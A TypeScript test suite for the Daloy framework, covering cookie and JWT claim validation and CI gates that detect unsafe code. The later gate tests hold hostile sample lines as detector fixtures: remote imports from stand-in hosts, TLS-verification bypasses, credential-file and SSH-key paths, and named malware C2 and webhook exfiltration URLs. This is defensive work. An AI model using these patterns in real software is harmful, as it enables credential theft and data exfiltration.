/**
 * Single-source-of-truth bake-in regression coverage.
 *
 * Validates the four SSoT surfaces shipped in 0.27.0:
 *
 *   1. {@link assertCookieAttributes} / {@link serializeCookie} / {@link readRequestCookie}
 *      from `src/cookie.ts` — the only place Daloy validates cookie attributes.
 *   2. {@link assertTemporalClaims} / {@link TemporalClaimError} from
 *      `src/time-claims.ts` — the only place Daloy validates JWT-style
 *      `exp` / `nbf` / `iat` claims.
 *   3. The `__Secure-` production refuse-to-boot guard added to
 *      `session()` and `csrf()`.
 *   4. The CI grep gates in `scripts/verify-no-runtime-deps.ts` and
 *      `scripts/verify-secret-comparisons.ts`.
 *
 * @since 0.27.0
 */

import assert from "node:assert/strict";
import { test } from "node:test";

import {
  assertCookieAttributes,
  readRequestCookie,
  serializeClearCookie,
  serializeCookie,
} from "../src/cookie.js";
import {
  TemporalClaimError,
  assertTemporalClaims,
} from "../src/time-claims.js";
import { session } from "../src/session.js";
import { csrf } from "../src/middleware.js";
import { findForbiddenRuntimeDependencies } from "../scripts/verify-no-runtime-deps.js";
import { findForbiddenSecretComparisons } from "../scripts/verify-secret-comparisons.js";
import { findForbiddenBufferCalls } from "../scripts/verify-no-unsafe-buffer.js";
import {
  CREDENTIAL_CONTENT_PATTERNS,
  findCredentialLeaks,
  PUBLISHABLE_PACKAGES,
  scanFileContentForCredentials,
} from "../scripts/verify-no-leaked-credentials.js";
import {
  ADDITIONAL_SOURCE_ROOTS,
  FORBIDDEN_CLASSES,
  findInvisibleUnicodeInPackage,
  findInvisibleUnicodeInSourceRoot,
  PUA_RANGES,
  PUBLISHABLE_PACKAGES as INVISIBLE_PUBLISHABLE_PACKAGES,
  scanFileForInvisibleUnicode,
} from "../scripts/verify-no-invisible-unicode.js";

// ---------- cookie.ts ----------

test("assertCookieAttributes accepts a plain RFC 6265 cookie", () => {
  assert.doesNotThrow(() =>
    assertCookieAttributes({
      scope: "cookie",
      name: "session",
      attributes: { secure: true, path: "/", sameSite: "Lax", httpOnly: true },
    }),
  );
});

test("assertCookieAttributes rejects malformed names", () => {
  assert.throws(
    () => assertCookieAttributes({ scope: "cookie", name: "bad name", attributes: {} }),
    /cookie name/,
  );
  assert.throws(
    () => assertCookieAttributes({ scope: "cookie", name: "bad;name", attributes: {} }),
    /cookie name/,
  );
  assert.throws(
    () => assertCookieAttributes({ scope: "cookie", name: "", attributes: {} }),
    /cookie name/,
  );
});

test("assertCookieAttributes enforces __Host- contract", () => {
  assert.throws(
    () =>
      assertCookieAttributes({
        scope: "cookie",
        name: "__Host-x",
        attributes: { secure: false, path: "/" },
      }),
    /__Host-/,
  );
  assert.throws(
    () =>
      assertCookieAttributes({
        scope: "cookie",
        name: "__Host-x",
        attributes: { secure: true, path: "/api" },
      }),
    /__Host-/,
  );
  assert.throws(
    () =>
      assertCookieAttributes({
        scope: "cookie",
        name: "__Host-x",
        attributes: { secure: true, path: "/", domain: "example.com" },
      }),
    /__Host-/,
  );
});

test("assertCookieAttributes enforces __Secure- contract", () => {
  assert.throws(
    () =>
      assertCookieAttributes({
        scope: "cookie",
        name: "__Secure-x",
        attributes: { secure: false },
      }),
    /__Secure-/,
  );
  assert.doesNotThrow(() =>
    assertCookieAttributes({
      scope: "cookie",
      name: "__Secure-x",
      attributes: { secure: true },
    }),
  );
});

test("assertCookieAttributes refuses __Secure- without secure in production", () => {
  assert.throws(
    () =>
      assertCookieAttributes({
        scope: "cookie",
        name: "__Secure-x",
        attributes: { secure: false },
        isProduction: true,
      }),
    /silently drop|production|HTTP/i,
  );
});

test("assertCookieAttributes enforces SameSite=None requires Secure", () => {
  assert.throws(
    () =>
      assertCookieAttributes({
        scope: "cookie",
        name: "x",
        attributes: { sameSite: "None", secure: false },
      }),
    /SameSite/i,
  );
});

test("assertCookieAttributes enforces path starts with /", () => {
  assert.throws(
    () =>
      assertCookieAttributes({
        scope: "cookie",
        name: "x",
        attributes: { path: "api" },
      }),
    /path must start/,
  );
});

test("serializeCookie round-trips through readRequestCookie", () => {
  const cookieLine = serializeCookie("session", "abc 123", {
    httpOnly: true,
    secure: true,
    path: "/",
    sameSite: "Lax",
    maxAgeSeconds: 60,
  });
  assert.match(cookieLine, /^session=abc%20123;/);
  assert.match(cookieLine, /HttpOnly/);
  assert.match(cookieLine, /Secure/);
  assert.match(cookieLine, /SameSite=Lax/);
  assert.match(cookieLine, /Max-Age=60/);

  // Simulate a browser sending the cookie back.
  const header = "other=value; session=abc%20123; trailing=1";
  assert.equal(readRequestCookie(header, "session"), "abc 123");
});

test("serializeCookie validates attributes through the shared cookie guard", () => {
  assert.throws(
    () => serializeCookie("bad;name", "value"),
    /cookieName/,
  );
  assert.throws(
    () => serializeCookie("__Secure-x", "value", { secure: false }),
    /__Secure-/,
  );
});

test("serializeClearCookie emits Max-Age=0", () => {
  const cleared = serializeClearCookie("session", { path: "/", secure: true });
  assert.match(cleared, /^session=;/);
  assert.match(cleared, /Max-Age=0/);
});

test("readRequestCookie returns null for missing or absent input", () => {
  assert.equal(readRequestCookie(null, "x"), null);
  assert.equal(readRequestCookie("", "x"), null);
  assert.equal(readRequestCookie("a=1; b=2", "missing"), null);
});

test("readRequestCookie rejects duplicate cookies (cookie-tossing defense)", () => {
  // Cookie-tossing scenario: an attacker has injected a shadow cookie
  // (e.g. via subdomain XSS or a misconfigured parent-domain Set-Cookie)
  // that arrives in the same `Cookie` header alongside the legitimate
  // one. Browsers list path-specific cookies first, so a naive "first
  // wins" reader would authenticate as the attacker. We refuse both.
  assert.equal(
    readRequestCookie("sid=attacker; sid=legit", "sid"),
    null,
  );
  assert.equal(
    readRequestCookie("sid=legit; other=ok; sid=attacker", "sid"),
    null,
  );
  // A single occurrence is still returned normally.
  assert.equal(readRequestCookie("sid=legit; other=ok", "sid"), "legit");
  // Duplicates of a *different* name do not poison unrelated reads.
  assert.equal(
    readRequestCookie("other=a; sid=legit; other=b", "sid"),
    "legit",
  );
});

// ---------- time-claims.ts ----------

test("assertTemporalClaims accepts a valid token window", () => {
  const now = 1_700_000_000;
  assert.doesNotThrow(() =>
    assertTemporalClaims(
      { iat: now - 10, nbf: now - 5, exp: now + 60 },
      { now },
    ),
  );
});

test("assertTemporalClaims rejects expired tokens", () => {
  const now = 1_700_000_000;
  assert.throws(
    () => assertTemporalClaims({ exp: now - 1 }, { now }),
    (err) => err instanceof TemporalClaimError && err.code === "token_expired",
  );
});

test("assertTemporalClaims rejects nbf in future", () => {
  const now = 1_700_000_000;
  assert.throws(
    () => assertTemporalClaims({ nbf: now + 60 }, { now }),
    (err) => err instanceof TemporalClaimError && err.code === "token_not_yet_valid",
  );
});

test("assertTemporalClaims rejects iat in future", () => {
  const now = 1_700_000_000;
  assert.throws(
    () => assertTemporalClaims({ iat: now + 60 }, { now }),
    (err) => err instanceof TemporalClaimError && err.code === "iat_in_future",
  );
});

test("assertTemporalClaims rejects non-finite numeric claims", () => {
  const now = 1_700_000_000;
  assert.throws(
    () => assertTemporalClaims({ exp: "soon" as unknown as number }, { now }),
    (err) => err instanceof TemporalClaimError && err.code === "invalid_exp",
  );
  assert.throws(
    () => assertTemporalClaims({ nbf: Number.NaN }, { now }),
    (err) => err instanceof TemporalClaimError && err.code === "invalid_nbf",
  );
  assert.throws(
    () => assertTemporalClaims({ iat: Number.POSITIVE_INFINITY }, { now }),
    (err) => err instanceof TemporalClaimError && err.code === "invalid_iat",
  );
});

test("assertTemporalClaims honors clockSkewSeconds at both ends", () => {
  const now = 1_700_000_000;
  // exp just past, but inside skew window — accepted.
  assert.doesNotThrow(() =>
    assertTemporalClaims({ exp: now - 5 }, { now, clockSkewSeconds: 10 }),
  );
  // nbf just ahead, but inside skew window — accepted.
  assert.doesNotThrow(() =>
    assertTemporalClaims({ nbf: now + 5 }, { now, clockSkewSeconds: 10 }),
  );
});

// ---------- __Secure- refuse-to-boot on session() and csrf() ----------

test('session() refuses "__Secure-" cookie name without secure:true', () => {
  assert.throws(
    () =>
      session({
        secret: "x".repeat(48),
        cookieName: "__Secure-foo",
        cookieOptions: { secure: false },
      }),
    /__Secure-/,
  );
});

test('session() accepts "__Secure-" cookie when secure:true and path:/', () => {
  assert.doesNotThrow(() =>
    session({
      secret: "x".repeat(48),
      cookieName: "__Secure-foo",
      cookieOptions: { secure: true, path: "/" },
    }),
  );
});

test('csrf() refuses "__Secure-" cookie name without secure:true', () => {
  assert.throws(
    () =>
      csrf({
        cookieName: "__Secure-foo",
        cookieOptions: { secure: false },
      }),
    /__Secure-/,
  );
});

// ---------- CI gates ----------

test("verify-no-runtime-deps treats an empty dependencies block as clean", () => {
  assert.deepEqual(findForbiddenRuntimeDependencies({ dependencies: {} }), []);
  assert.deepEqual(findForbiddenRuntimeDependencies({}), []);
});

test("verify-no-runtime-deps flags any non-empty dependencies block", () => {
  const found = findForbiddenRuntimeDependencies({ dependencies: { lodash: "^4" } });
  assert.deepEqual([...found], ["lodash"]);
});

test("verify-secret-comparisons flags forbidden equality on header-derived values", () => {
  const sample = [
    '// safe: comparing scheme name',
    'if (scheme === "Bearer") return true;',
    '// safe: OpenAPI enum comparison, not a header-derived cookie secret',
    'if (options.in !== "header" && options.in !== "query" && options.in !== "cookie") fail();',
    "",
    "// unsafe: comparing the actual secret",
    "if (authorizationToken === provided) return true;",
    "",
    "// unsafe: hardcoded API key literal is still a secret comparison",
    'if (apiKey === "dev-secret") return true;',
    "",
    "// unsafe: direct header read compared with strict equality",
    'if (ctx.request.headers.get("authorization") !== expected) return false;',
    "",
    "// unsafe: cookie value",
    "if (cookieValue !== expectedCsrfToken) reject();",
    "",
    "// unsafe: loose equality on a secret",
    "if (apiKey == provided) ok();",
    "",
    "// unsafe: loose inequality on a secret",
    "if (apiKey != expected) reject();",
    "",
    "// unsafe: prefix probe leaks the secret one byte at a time (CCC CTF class)",
    'if (authorizationHeader.startsWith("Bearer " + expectedToken)) return true;',
    "",
    "// unsafe: substring probe",
    "if (cookieValue.includes(expectedCsrfToken)) ok();",
    "",
    "// unsafe: indexOf probe",
    "if (apiKey.indexOf(prefix) === 0) ok();",
    "",
    "// unsafe: endsWith probe",
    "if (sessionToken.endsWith(suffix)) ok();",
    "",
    "// unsafe: localeCompare also short-circuits",
    "if (bearerToken.localeCompare(expected) === 0) ok();",
  ].join("\n");
  const findings = findForbiddenSecretComparisons("sample.ts", sample);
  // The static `"Bearer"` and OpenAPI enum lines are allowed; everything
  // else (strict, loose, and short-circuiting string probes) must fail.
  assert.equal(findings.length, 11);
  assert.match(findings[0]!.text, /authorizationToken/);
  assert.match(findings[1]!.text, /apiKey/);
  assert.match(findings[2]!.text, /headers\.get/);
  assert.match(findings[3]!.text, /cookieValue/);
  assert.match(findings[4]!.text, /apiKey == provided/);
  assert.match(findings[5]!.text, /apiKey != expected/);
  assert.match(findings[6]!.text, /startsWith/);
  assert.match(findings[7]!.text, /includes/);
  assert.match(findings[8]!.text, /indexOf/);
  assert.match(findings[9]!.text, /endsWith/);
  assert.match(findings[10]!.text, /localeCompare/);
});

test("verify-secret-comparisons accepts the audited source files", async () => {
  const { readFile } = await import("node:fs/promises");
  const path = await import("node:path");
  const files = ["src/session.ts", "src/security.ts", "src/security-schemes.ts", "src/middleware.ts"];
  let total = 0;
  for (const f of files) {
    const text = await readFile(path.resolve(process.cwd(), f), "utf8");
    total += findForbiddenSecretComparisons(f, text).length;
  }
  assert.equal(total, 0, "audited files must remain free of forbidden secret comparisons");
});

test("verify-no-unsafe-buffer flags forbidden Buffer call sites", () => {
  const sample = [
    "// safe: API references in prose should not trip the gate",
    'const note = "Buffer.allocUnsafe is forbidden, use Buffer.alloc";',
    "const safe1 = Buffer.alloc(16);",
    "const safe2 = Buffer.from(input);",
    "const safe3: Buffer = Buffer.from(input);",
    "",
    "// unsafe: deprecated constructor",
    "const bad1 = new Buffer(16);",
    "",
    "// unsafe: zero-fill bypass",
    "const bad2 = Buffer.allocUnsafe(64);",
    "",
    "// unsafe: slow variant",
    "const bad3 = Buffer.allocUnsafeSlow(64);",
  ].join("\n");
  const findings = findForbiddenBufferCalls("sample.ts", sample);
  assert.equal(findings.length, 3);
  assert.match(findings[0]!.reason, /deprecated/);
  assert.match(findings[0]!.text, /new Buffer/);
  assert.match(findings[1]!.reason, /uninitialized/);
  assert.match(findings[1]!.text, /allocUnsafe/);
  assert.match(findings[2]!.text, /allocUnsafeSlow/);
});

test("verify-no-unsafe-buffer ignores Buffer references inside comments and strings", () => {
  const sample = [
    "/* This block comment mentions Buffer.allocUnsafe and new Buffer() and must not trip. */",
    'const msg = "do not call Buffer.allocUnsafe(...) here";',
    "// new Buffer(0) is deprecated -- this comment is fine",
    "const ok = Buffer.alloc(0);",
  ].join("\n");
  const findings = findForbiddenBufferCalls("sample.ts", sample);
  assert.equal(findings.length, 0);
});

test("verify-no-unsafe-buffer accepts the live src/ tree", async () => {
  const { readFile, readdir } = await import("node:fs/promises");
  const path = await import("node:path");
  const srcRoot = path.resolve(process.cwd(), "src");
  async function* walk(dir: string): AsyncGenerator<string> {
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      const child = path.join(dir, entry.name);
      if (entry.isDirectory()) yield* walk(child);
      else if (entry.isFile() && /\.(?:m?ts|m?js)$/.test(entry.name)) yield child;
    }
  }
  let total = 0;
  for await (const absolute of walk(srcRoot)) {
    const rel = path.relative(process.cwd(), absolute);
    const text = await readFile(absolute, "utf8");
    total += findForbiddenBufferCalls(rel, text).length;
  }
  assert.equal(
    total,
    0,
    "src/ must remain free of `new Buffer(...)` and `Buffer.allocUnsafe*`; see https://snyk.io/blog/exploiting-buffer/",
  );
});

// ---------- verify-no-weak-random (Aikido Python Top 10 #10 gate) ----------

test("verify-no-weak-random flags Math.random() without the allow marker", async () => {
  const { findForbiddenWeakRandomCalls } = await import(
    "../scripts/verify-no-weak-random.js"
  );
  const sample = [
    "// non-crypto token mint -- should trip",
    "const tok = Math.random().toString(36).slice(2);",
    "",
    "// spaced variant -- should also trip",
    "const jitter = Math . random ( ) * 1000;",
  ].join("\n");
  const findings = findForbiddenWeakRandomCalls("sample.ts", sample);
  assert.equal(findings.length, 2);
  assert.match(findings[0]!.reason, /non-cryptographic/);
  assert.match(findings[0]!.text, /Math\.random/);
  assert.match(findings[1]!.text, /Math \. random/);
});

test("verify-no-weak-random ignores Math.random() inside comments, strings, and allow-marked lines", async () => {
  const { findForbiddenWeakRandomCalls } = await import(
    "../scripts/verify-no-weak-random.js"
  );
  const sample = [
    "/* Block comment about Math.random() must not trip. */",
    'const msg = "do not call Math.random() here";',
    "// inline mention of Math.random() in a line comment is also fine",
    "// allow-marked fallback (documented runtime gap)",
    "const fallback = Math.random().toString(36); // daloy-allow-weak-random: only runs when Web Crypto is unavailable",
    "const safe = crypto.randomUUID();",
  ].join("\n");
  const findings = findForbiddenWeakRandomCalls("sample.ts", sample);
  assert.equal(findings.length, 0);
});

test("verify-no-weak-random accepts the live src/ tree", async () => {
  const { findForbiddenWeakRandomCalls } = await import(
    "../scripts/verify-no-weak-random.js"
  );
  const { readFile, readdir } = await import("node:fs/promises");
  const path = await import("node:path");
  const srcRoot = path.resolve(process.cwd(), "src");
  async function* walk(dir: string): AsyncGenerator<string> {
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      const child = path.join(dir, entry.name);
      if (entry.isDirectory()) yield* walk(child);
      else if (entry.isFile() && /\.(?:m?ts|m?js)$/.test(entry.name)) yield child;
    }
  }
  let total = 0;
  for await (const absolute of walk(srcRoot)) {
    const rel = path.relative(process.cwd(), absolute);
    const text = await readFile(absolute, "utf8");
    total += findForbiddenWeakRandomCalls(rel, text).length;
  }
  assert.equal(
    total,
    0,
    "src/ must remain free of `Math.random()` outside the allow-marked Web-Crypto fallback; see https://www.aikido.dev/blog/python-security-vulnerabilities (item #10)",
  );
});

// ---------- verify-no-remote-exec (Aikido BlokTrooper gate) ----------

test("verify-no-remote-exec flags every documented BlokTrooper-class primitive", async () => {
  const { findForbiddenRemoteExecCalls } = await import(
    "../scripts/verify-no-remote-exec.js"
  );
  const sample = [
    "// safe: API references in prose should not trip the gate",
    'const note = "do not call eval() or new Function() in core";',
    "// safe: member-access .eval(...) is a foreign method (e.g. Redis Lua)",
    "client.eval(SCRIPT, [k], [v]);",
    "",
    "// unsafe: ESM import of child_process",
    'import { spawn } from "node:child_process";',
    "",
    "// unsafe: ESM import of vm",
    "import * as vm from 'vm';",
    "",
    "// unsafe: bare eval() of a downloaded string",
    "const r = eval(downloaded);",
    "",
    "// unsafe: new Function compiles a string into JS",
    'const fn = new Function("return 1");',
    "",
    "// unsafe: dynamic remote import",
    'const mod = await import("https://evil.example/x.js");',
  ].join("\n");
  const findings = findForbiddenRemoteExecCalls("sample.ts", sample);
  assert.equal(findings.length, 5, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /child_process/);
  assert.match(findings[1]!.reason, /node:vm/);
  assert.match(findings[2]!.reason, /eval/);
  assert.match(findings[3]!.reason, /new Function/);
  assert.match(findings[4]!.reason, /remote dynamic/);
});

test("verify-no-remote-exec ignores forbidden tokens inside comments and strings", async () => {
  const { findForbiddenRemoteExecCalls } = await import(
    "../scripts/verify-no-remote-exec.js"
  );
  const sample = [
    "/* This block comment mentions eval() and new Function() and must not trip. */",
    'const msg = "do not call eval() or new Function() here";',
    "// import { spawn } from 'node:child_process' -- this is a comment",
    "const ok = 1;",
    "// safe: member-access .eval method (Redis Lua)",
    "await redis.eval(script, keys, args);",
  ].join("\n");
  const findings = findForbiddenRemoteExecCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-remote-exec accepts the live src/ tree", async () => {
  const { findForbiddenRemoteExecCalls } = await import(
    "../scripts/verify-no-remote-exec.js"
  );
  const { readFile, readdir } = await import("node:fs/promises");
  const path = await import("node:path");
  const srcRoot = path.resolve(process.cwd(), "src");
  async function* walk(dir: string): AsyncGenerator<string> {
    for (const entry of await readdir(dir, { withFileTypes: true })) {
      const child = path.join(dir, entry.name);
      if (entry.isDirectory()) yield* walk(child);
      else if (entry.isFile() && /\.(?:m?ts|m?js)$/.test(entry.name)) yield child;
    }
  }
  let total = 0;
  for await (const absolute of walk(srcRoot)) {
    const rel = path.relative(process.cwd(), absolute);
    const text = await readFile(absolute, "utf8");
    total += findForbiddenRemoteExecCalls(rel, text).length;
  }
  assert.equal(
    total,
    0,
    "src/ must remain free of `node:child_process`, `node:vm`, bare `eval(...)`, " +
      "`new Function(...)`, and remote dynamic imports; see " +
      "https://www.aikido.dev/blog/fast-draft-open-vsx-bloktrooper",
  );
});

// ---------- verify-no-registry-exfiltration (Socket GemStuffer gate) ----------

test("verify-no-registry-exfiltration flags every documented GemStuffer-class primitive", async () => {
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: TLS verification bypass (GemStuffer VERIFY_NONE)",
    "const agent = new Agent({ rejectUnauthorized: false });",
    "",
    "// unsafe: process-wide TLS bypass via env",
    'process.env.NODE_TLS_REJECT_UNAUTHORIZED = "0";',
    "",
    "// unsafe: HOME override (GemStuffer credential injection)",
    'process.env.HOME = "/tmp/gemhome";',
    "",
    "// unsafe: npm publish-API path in source",
    'const url = "https://registry.npmjs.org/-/npm/v1/publish";',
    "",
    "// unsafe: RubyGems publish endpoint literal",
    'const r = "https://rubygems.org/api/v1/gems";',
    "",
    "// unsafe: PyPI legacy upload endpoint",
    'const p = "https://upload.pypi.org/legacy/";',
    "",
    "// unsafe: crates.io publish endpoint",
    'const c = "https://crates.io/api/v1/crates/new";',
    "",
    "// unsafe: host .npmrc read",
    'const rc = path.join(home, "/.npmrc");',
    "",
    "// unsafe: host yarn credentials",
    'const yr = home + "/.yarnrc.yml";',
    "",
    "// unsafe: host .netrc",
    'const nr = home + "/.netrc";',
    "",
    "// unsafe: GemStuffer's fabricated gem credentials path",
    'const gc = "/tmp/gemhome/.gem/credentials";',
    "",
    "// unsafe: Lazarus / Jade Sleet paired-package token-handoff staging dir",
    'const tok = home + "/.vscode/jsontoken";',
    "",
    "// unsafe: Lazarus / Jade Sleet documented C2 host",
    'const c2 = "https://npmjsregister.com/getupdate.php";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  // Each of the 13 forbidden lines must produce exactly one finding.
  assert.equal(findings.length, 13, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /rejectUnauthorized/);
  assert.match(findings[1]!.reason, /NODE_TLS_REJECT_UNAUTHORIZED/);
  assert.match(findings[2]!.reason, /HOME/);
  assert.match(findings[3]!.reason, /npm publish-API/);
  assert.match(findings[4]!.reason, /RubyGems/);
  assert.match(findings[5]!.reason, /PyPI/);
  assert.match(findings[6]!.reason, /crates\.io/);
  assert.match(findings[7]!.reason, /\.npmrc/);
  assert.match(findings[8]!.reason, /yarnrc/);
  assert.match(findings[9]!.reason, /\.netrc/);
  assert.match(findings[10]!.reason, /\.gem\/credentials/);
  assert.match(findings[11]!.reason, /\.vscode/);
  assert.match(findings[12]!.reason, /npmjsregister\.com/);
});

test("verify-no-registry-exfiltration flags every RATatouille / rand-user-agent tradecraft primitive", async () => {
  // RATatouille IOCs documented in
  // https://www.aikido.dev/blog/catching-a-rat-remote-access-trojian-rand-user-agent-supply-chain-compromise
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: aliased-require via global member assignment",
    "global.r = require;",
    "",
    "// unsafe: aliased-require via globalThis bracket assignment",
    'globalThis["r"] = require;',
    "",
    "// unsafe: manual NODE_PATH injection (RATatouille side-load primitive)",
    'module.paths.push(path.join(home, ".node_modules", "node_modules"));',
    "",
    "// unsafe: leading-dot hidden install dir literal",
    'const stash = path.join(home, ".node_modules");',
    "",
    "// unsafe: raw-IPv4 http URL (DNS-less C2 IOC)",
    'const c2 = "http://203.0.113.7:3306";',
    "",
    "// unsafe: raw-IPv4 ws URL (socket.io-shape C2)",
    'const sock = "ws://198.51.100.42:8080/socket";',
    "",
    "// unsafe: documented RATatouille C2 IP literal",
    'const ioc = "85.239.62.36";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  // Each of the 7 forbidden lines must produce exactly one finding.
  // Note: the raw-IPv4 URL pattern matches the C2 IP literal IFF it is
  // inside an http(s):///ws(s):// URL; the bare-literal pattern matches
  // it on its own line as a final belt-and-braces IOC gate.
  assert.equal(findings.length, 7, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /aliased-require/);
  assert.match(findings[1]!.reason, /aliased-require/);
  assert.match(findings[2]!.reason, /module\.paths\.push/);
  assert.match(findings[3]!.reason, /\.node_modules/);
  assert.match(findings[4]!.reason, /raw-IPv4/);
  assert.match(findings[5]!.reason, /raw-IPv4/);
  assert.match(findings[6]!.reason, /RATatouille/);
});

test("verify-no-registry-exfiltration allowlists loopback / unspecified / localhost raw hosts", async () => {
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// safe: loopback for local dev",
    'const dev = "http://127.0.0.1:3000/health";',
    "// safe: unspecified-bind URL",
    'const bind = "http://0.0.0.0:8080/";',
    "// safe: localhost hostname",
    'const lh = "ws://localhost:9229/inspect";',
    "// safe: normal node_modules path (no leading dot)",
    'const np = path.join(cwd, "node_modules", "@scope", "pkg");',
    "// safe: reading a property on `global` is fine, only `global.X = require` is forbidden",
    "const r = global.something;",
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration ignores forbidden tokens inside comments and code-only strings", async () => {
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "/* This block comment mentions rejectUnauthorized: false and HOME = '/tmp' and must not trip. */",
    "// also a line comment about NODE_TLS_REJECT_UNAUTHORIZED",
    'const doc = "do not write rejectUnauthorized: false in real code";',
    "// reading equality on HOME is not a mutation",
    'if (process.env.HOME === "/root") { /* ok */ }',
    "// docstring referencing the host file generically",
    'const note = "see npmjs.com docs for auth";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 0, JSON.stringify(findings, null, 2));
});

test("verify-no-registry-exfiltration flags the xrpl.js / Ripple SDK exfiltration IOC", async () => {
  // xrpl.js / Ripple SDK supply-chain compromise (April 2025):
  // https://www.aikido.dev/blog/xrp-supplychain-attack-official-npm-package-infected-with-crypto-stealing-backdoor
  // The hijacked-token publish of `xrpl@{2.14.2, 4.2.1, 4.2.2, 4.2.3, 4.2.4}`
  // shipped a `checkValidityOfSeed` function that POSTed wallet seeds
  // to `https://0x9c.xyz` via a plain global `fetch` to a registered
  // domain — the raw-IPv4 gate does not catch this on its own, so the
  // exfil host is gated as a bare-literal IOC.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: xrpl.js seed-exfiltration host as a URL literal",
    'const c2 = "https://0x9c.xyz/xc";',
    "",
    "// unsafe: same host, bare literal stashed for later string-concat",
    'const host = "0x9c.xyz";',
    "",
    "// unsafe: case-insensitive variant",
    'const upper = "0X9C.XYZ";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 3, JSON.stringify(findings, null, 2));
  assert.ok(findings.every((f) => /0x9c\.xyz/i.test(f.reason)));
  assert.ok(findings.every((f) => /xrpl/i.test(f.reason)));
});

test("verify-no-registry-exfiltration flags Telegram-bot SSH-backdoor IOCs", async () => {
  // Socket 2025-04-18 typosquat campaign documented at
  // https://socket.dev/blog/npm-malware-targets-telegram-bot-developers —
  // `node-telegram-utils` / `node-telegram-bots-api` / `node-telegram-util`
  // appended attacker SSH public keys to `~/.ssh/authorized_keys`, used
  // `ipinfo.io/ip` to discover the victim's external IP, and POSTed it
  // (with the Unix username) to `solana.validator.blog`.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: the SSH key injection target file",
    'const target = path.join(home, ".ssh/authorized_keys");',
    "",
    "// unsafe: ssh dir reference",
    'const sshDir = home + "/.ssh/";',
    "",
    "// unsafe: documented Telegram-bot C2 host (case-insensitive)",
    'const c2 = "https://Solana.Validator.Blog/v1/check";',
    "",
    "// unsafe: ipinfo.io/ip external-IP discovery",
    'const ip1 = "https://ipinfo.io/ip";',
    "",
    "// unsafe: icanhazip.com discovery",
    'const ip2 = "https://icanhazip.com/";',
    "",
    "// unsafe: ifconfig.me discovery",
    'const ip3 = "https://ifconfig.me/ip";',
    "",
    "// unsafe: ipify.org discovery",
    'const ip4 = "https://api.ipify.org/";',
    "",
    "// unsafe: AWS checkip discovery",
    'const ip5 = "https://checkip.amazonaws.com/";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  // Line 1 (`.ssh/authorized_keys`) trips two patterns but `findForbidden…`
  // breaks on first match, so each of the 8 forbidden lines produces
  // exactly one finding.
  assert.equal(findings.length, 8, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /authorized_keys/);
  assert.match(findings[1]!.reason, /\.ssh/);
  assert.match(findings[2]!.reason, /solana\.validator\.blog/i);
  assert.match(findings[3]!.reason, /ipinfo\.io\/ip/);
  assert.match(findings[4]!.reason, /icanhazip\.com/);
  assert.match(findings[5]!.reason, /ifconfig\.me/);
  assert.match(findings[6]!.reason, /api\.ipify\.org/);
  assert.match(findings[7]!.reason, /checkip\.amazonaws\.com/);
});

test("verify-no-registry-exfiltration flags 60-package Discord-webhook recon IOCs", async () => {
  // Socket 2025-05-23 campaign documented at
  // https://socket.dev/blog/60-malicious-npm-packages-leak-network-and-host-data —
  // sixty malicious npm packages published under three throwaway
  // accounts ran a `postinstall` script that collected host
  // fingerprint data via `os.networkInterfaces()`, `dns.getServers()`,
  // and `https.get("https://ipinfo.io/json", ...)`, then POSTed the
  // JSON blob to a `https://discord.com/api/webhooks/<id>/<token>`
  // exfiltration channel.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
  const sample = [
    "// unsafe: ipinfo.io/json external IP/org discovery (60-pkg variant)",
    'const ext = "https://ipinfo.io/json";',
    "",
    "// unsafe: Discord webhook exfiltration channel",
    'const wh = "https://discord.com/api/webhooks/1330015051482005555/5fll497pcjzKBiY3b_oa9YRh";',
    "",
    "// unsafe: discordapp.com legacy webhook host",
    'const wh2 = "https://discordapp.com/api/webhooks/123/abc";',
  ].join("\n");
  const findings = findForbiddenRegistryExfilCalls("sample.ts", sample);
  assert.equal(findings.length, 3, JSON.stringify(findings, null, 2));
  assert.match(findings[0]!.reason, /ipinfo\.io\/json/);
  assert.match(findings[1]!.reason, /discord\.com\/api\/webhooks/i);
  assert.match(findings[2]!.reason, /discord\.com\/api\/webhooks/i);
});

test("verify-no-registry-exfiltration flags Advcash reverse-shell IOCs", async () => {
  // Socket 2025-04-14 reverse-shell campaign documented at
  // https://socket.dev/blog/npm-package-advcash-integration-triggers-reverse-shell —
  // `@naderabdi/merchant-advcash` posed as a payment-gateway integration
  // and dialed a reverse shell via `cp.spawn("/bin/sh", [])` +
  // `client.connect(8443, "65.109.184.223")` from the `url_success`
  // callback. The IOC IP appears as a BARE literal (not in a URL),
  // and `/bin/sh` / `/bin/bash` / `cmd.exe` shell-name literals have
  // no legitimate use in `src/**`.
  const { findForbiddenRegistryExfilCalls } = await import(
    "../scripts/verify-no-registry-exfiltration.js"
  );
